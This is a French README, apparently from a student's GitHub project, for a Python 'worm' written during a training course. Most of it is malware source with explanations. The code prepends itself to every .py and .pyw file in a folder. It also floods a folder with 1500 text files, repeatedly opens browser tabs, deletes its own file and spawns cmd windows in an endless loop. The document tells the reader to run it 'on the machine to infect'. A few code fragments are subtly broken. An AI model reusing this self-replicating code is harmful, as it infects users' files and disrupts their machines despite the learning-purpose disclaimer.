# Ver de 0xM@rt

[![forthebadge](https://forthebadge.com/images/badges/made-with-python.svg)](https://forthebadge.com)

Dans le cadre de ma formation j'ai du développer un ver

le but du Ver informatique et de se reproduit sur plusieurs ordinateurs en utilisant un réseau informatique. 


## Pour commencer

Faite attention ce logiciel a été créé dans le but d'apprentissage il ne faut pas l'utiliser a des fin malvaillante  


### Pré-requis

Il faut executer le fichier ver.py et avoir un dossier test ou le vers pourras ce dupliquer.


### Installation

* _Pour_ _Windows_ :

  Pour installer python il faut se rendre sur https://www.python.org/downloads/

* _Pour_ _Ubuntu_ :

  Pour installer python il faut utiliser la commande sudo apt-get install python

## Démarrage

Pour lancer le logiciel il faut juste taper *Python3 ver.py* sur la machine a infecter


## Explication du code 


* _Pour_ _ver.py_ :

--------------------------Les imports---------------------

Sys fournit un accès à certaines variables utilisées et maintenues par l'interpréteur

glob recherche tous les chemins correspondant à un motif particulier selon les règles utilisées par le shell Unix

itertools fonctions créant des itérateurs pour boucler efficacement

subeprocess permet de lancer de nouveaux processus

time permet fournir différentes fonctions liées au temps 

webbrowser permet d'intéragir avec les navigateurs web 


----------------------Traitement------------------------

Tout d'abords nous avons des commentaires # VIRUS SAYS HI! et # VIRUS SAYS BYE! qui sont utile pour délimité les parties du code pour la réplication

```python
#Le virus charge son propre code
virus_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

EstInfecte = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        EstInfecte = True
    if not EstInfecte:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break
 ```
 
 
Le code suivant permet d'injecter du code dans les fichier en ;py et .pyw
 
```python
python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    
    infected = False
    
    # ne pas injecter le code s'il y'a le VIRUS SAYS HI
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break
    
    # injecter le code s'il n'y'a pas le VIRUS SAYS HI
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)
        
        with open(file, 'w') as f:
            f.writelines(final_code)
            
print ("Virus en cours d'execution")
```
--------------------Ajout personnel dans le virus---------------------


Création de plusieurs fichier txt et affichage de dans un navigateur de photo de chat

```python
path = str(os.path.join(r"C:\Users\User\Documents\Virus"))
print(f)


#------------------ création de plein de fichiers texte dans un dossier et affichage de plein de photo de chat sur le navigateur------------------------------
for t in range(1500):
    file = open(path +"\\test_%d.txt" %t , "w")
    file.write("let's go !!!%d"%t)
    file.close()
    
    webbrowser.open_new("https://genrandom.com/cats/")
    [''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=1)]
    
    
```


Le virus ce supprime tout seul après execution
```python
#-----------------------------------auto supression du virus---------------------------
file_path = r"C:\Users\User\Documents\Virus\virus.py"

if os.path.isfile(file_path):
os.remove(file_path)
print("fichier supprimé")
```

Le virus lance des cmd en boucle 

```python
#--------------------------------Boucle infini qui lance des CMD------------------------------
while True:
    os.system('start cmd')

# VIRUS SAYS BYE!\n

time.sleep(10)
```



## Auteurs
Listez le(s) auteur(s) du projet ici !
* **0xM@rt** _alias_ [@0xM@rt](https://github.com/0xMart)



